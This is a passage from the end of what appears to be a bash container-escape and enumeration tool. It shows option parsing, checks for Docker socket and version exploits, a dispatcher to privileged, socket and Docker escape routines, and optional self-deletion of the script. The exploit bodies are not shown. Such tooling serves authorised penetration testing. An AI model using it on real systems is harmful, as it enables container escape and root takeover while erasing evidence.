    noNetwork="1"
    shift
    ;;
  -nc | --no-cols | --no-colors | --no-colours)
    unsetColors
    shift
    ;;
  -q | --quiet)
    quiet="1"
    shift
    ;;
  -e | -ex | --exploit)
    exploit="$2"
    shift
    shift
    ;;
  -l | --listen)
    listen="1"
    shift
    ;;
  --user|--username)
    username="$2"
    shift
    shift
    ;;
  -cmd | --command)
    command="$2"
    shift
    shift
    ;;
  --pass|--password)
    password="$2"
    shift
    shift
    ;;
  -s | --shadow)
    shadow="1"
    shift
    ;;
  -i | --ip)
    ip="$2"
    shift
    shift
    ;;
  -p | --port)
    port="$2"
    shift
    shift
    ;;
  --install)
    install="1"
    shift
    ;;
  -doc | --delete | --delete-on-complete)
    delete="1"
    shift
    ;;
  *)
    echo "Unknown option $1"
    exit 1
    ;;
  esac
done

###########################################
#--------------) Execution (--------------#
###########################################

banner
describeColors
installPackages

if ! [ "$skipEnum" ]; then

  printSection "Enumerating Platform"
  containerCheck

  printQuestion "Inside Container ........"

  if [ "$inContainer" ]; then
    # Inside Container
    printYes
    containerType
    containerTools
    userCheck
    if [ "$containerType" = "docker" ]; then
      getDockerVersion
      dockerSockCheck
      checkDockerVersionExploits
    fi
    enumerateContainer
    findMountedFolders
    findInterestingFiles
    enumerateContainers
  else
    # Outside Container
    printNo
    userCheck
    containerTools
    getDockerVersion
    dockerSockCheck
    checkDockerVersionExploits
    enumerateContainers
  fi
fi

# Parse exploit argument
if [ "$exploit" ]; then
  case $exploit in
  docker | DOCKER)
    exploitDocker
    ;;
  priv | PRIV | privileged | PRIVILEGED)
    exploitPrivileged
    ;;
  sock | SOCK)
    exploitDockerSock
    ;;
  *)
    echo "Unknown exploit $1"
    exit 1
    ;;
  esac
fi

printSection ""


if [ "$delete" ]; then
  rm -- "$0"
fi

exit 0
